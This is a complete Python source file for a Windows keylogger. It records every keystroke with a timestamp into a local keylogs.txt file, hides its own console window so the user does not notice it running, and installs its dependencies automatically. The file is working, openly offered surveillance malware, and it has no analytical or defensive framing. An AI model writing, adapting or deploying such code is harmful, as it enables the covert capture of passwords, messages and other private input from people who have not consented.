import subprocess
import sys
import os
import win32console
import win32gui
from pynput import keyboard
from datetime import datetime

current_directory = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(current_directory, "keylogs.txt")

class Keylogger:
    def __init__(self, keylog_file):
        self.keylog_file = keylog_file
        self.install_packages()
        self.hide_console()

    def install_packages(self):
        packages = ['pywin32', 'pynput']
        
        for package in packages:
            try:
                __import__(package)
            except ImportError:
                print(f"{package} not installed. Installing...!")
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

    def hide_console(self):
        win = win32console.GetConsoleWindow()
        if win != 0:
            win32gui.ShowWindow(win, 0)

    def log_key(self, keylog):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {keylog}\n"
        with open(self.keylog_file, 'a') as f:
            f.write(log_entry)

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                keylog = '<ENTER>'
            elif key == keyboard.Key.backspace:
                keylog = '<BACKSPACE>'
            elif key == keyboard.Key.space:
                keylog = '<SPACE>'
            elif key == keyboard.Key.tab:
                keylog = '<TAB>'
            elif key == keyboard.Key.esc:
                keylog = '<ESC>'
            elif hasattr(key, 'char') and key.char:
                keylog = key.char if key.char.isprintable() else f'<{key.name}>'
            else:
                keylog = f'<{key.name}>'
        except AttributeError:
            keylog = '<UNKNOWN_KEY>'

        self.log_key(keylog)

    def on_release(self, key):
        pass

    def start(self):
        print(f"Keylogger started. Logging to: {self.keylog_file}")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(log_file)
    keylogger.start()
